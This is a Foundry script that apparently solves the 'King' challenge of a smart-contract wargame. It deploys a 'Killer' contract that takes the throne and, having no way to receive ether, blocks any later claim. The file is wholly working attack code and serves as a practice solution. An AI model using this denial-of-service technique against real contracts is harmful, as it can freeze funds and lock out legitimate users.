// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {King} from "../src/king.sol";

contract Killer {
    function attack(address payable _king) public payable {
        _king.call{value: msg.value}("");
    }
}

contract ForceSolution is Script {
    King public king;
    Killer public killer;

    function run() external {
        // vm.startBroadcast(0x...);// vm.envUint("PRIVATE_KEY") <= Faulty
        vm.startBroadcast();

        console.log("Solving king...");

        king = King(payable(0x6393Acdd0dd78A48b209eCDC735aFe74F87Cf7E3));
        // vm.stopBroadcast();
        // vm.startBroadcast(0x...);
        killer = new Killer();

        console.log("king: ", king._king());
        console.log("prize: ", king.prize());
        payable(king).call{value: king.prize()}("");
        console.log("Me king: ", king._king());
        console.log("prize: ", king.prize());

        killer.attack{value: king.prize()}(payable(king));
        console.log("Killer king: ", king._king());
        console.log("prize: ", king.prize());

        // payable(king).call{value: king.prize()}("");
        // console.log("Me not king: ", king._king());
        // console.log("prize: ", king.prize());
        vm.stopBroadcast();
        console.log("king Solved!");
    }
}
